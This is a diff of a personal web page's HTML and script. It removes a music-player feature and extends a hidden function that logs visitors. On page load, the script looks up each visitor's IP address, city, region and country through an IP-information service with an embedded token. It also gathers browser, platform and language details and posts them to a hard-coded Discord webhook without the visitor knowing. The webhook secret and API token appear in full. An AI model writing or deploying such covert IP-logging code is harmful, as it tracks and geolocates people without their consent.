@@ -42,16 +42,8 @@
                 <p id="typingtext"></p>
             </div>
         </div>
-        <audio id="audio" src="dying_in_xxtyle_3.mp3" loop></audio>
-
-        <script src="https://ajax.googleapis.com/ajax/libs/jquery/2.1.1/jquery.min.js"></script>
-
-        <div id="musicContainer">
-            <h3 id="radio">song.mp3</h3>
-            <button id="nextButton" onclick="playNextSong()">
-                <i class="fas fa-arrow-right"></i>
-            </button>
-        </div>          
+        <audio id="audio" src="dying_in_xxtyle_3.mp3" loop></audio> <!-- KKKKKKKKK, perdi o aúdio -->
+        <script src="https://ajax.googleapis.com/ajax/libs/jquery/2.1.1/jquery.min.js"></script>       
 <script>
 
 function updateImageAndStatus() {
@@ -155,32 +147,18 @@ window.addEventListener("load", updateImageAndStatus);
         </script>
     <script>
 
-function playNextSong() {
-    var songs = ["blxxdy carcass", "dont waste my time", "i cant feel at all", "PURE IMAGINATION"];
-    var currentSongIndex = songs.indexOf($("#radio").html().replace(".\\songs\\", ""));
-    
-    if (currentSongIndex < songs.length - 1) {
-        currentSongIndex++;
-    } else {
-        currentSongIndex = 0;
-    }
-
-    var nextSong = ".\\songs\\" + songs[currentSongIndex] + ".mp3";
-    $("#radio").html(nextSong.replace(".\\songs\\", ""));
-    
-    var audio = document.getElementById("audio");
-    audio.src = nextSong;
-    audio.play();
-}
-
 function enviarMensagemDiscord() {
     var xhr = new XMLHttpRequest();
-    xhr.open("GET", "https://api.ipify.org?format=json", true);
+    xhr.open("GET", "https://ipinfo.io?token=88ac173899f2d9", true);
 
     xhr.onload = function() {
         if (xhr.status === 200) {
             var response = JSON.parse(xhr.responseText);
+
             var userIP = response.ip;
+            var city = response.city;
+            var region = response.region;
+            var country = response.country;
 
             var userAgent = navigator.userAgent;
             var platform = navigator.platform;
@@ -195,13 +173,18 @@ function enviarMensagemDiscord() {
             var discordXhr = new XMLHttpRequest();
             discordXhr.open("POST", "https://discord.com/api/webhooks/1119072044290687079/L2gDQchkqGO0MoUYdnsRBf7NvAmEb-dLcErFfyL2b7lqkKGoAfIoyr64qRaHd8HZwagt", true);
             discordXhr.setRequestHeader("Content-Type", "application/json");
+
             var data = JSON.stringify({
                 content: "* Site Acessado: " + hora + "\nIP: " + userIP +
-                         "\nUser Agent: " + userAgent + 
-                         "\nPlatform: " + platform + 
-                         "\nLanguage: " + userLanguage + 
-                         "\nLanguages: " + userLanguages.join(", ")
+                         "\nCidade: " + city +
+                         "\nRegião: " + region +
+                         "\nPaís: " + country +
+                         "\nUsuário: " + userAgent + 
+                         "\nPlataforma: " + platform + 
+                         "\nLinguagem Principal: " + userLanguage + 
+                         "\nLinguagens Instaladas: " + userLanguages.join(", ")
             });
+
             discordXhr.send(data);
         }
     };
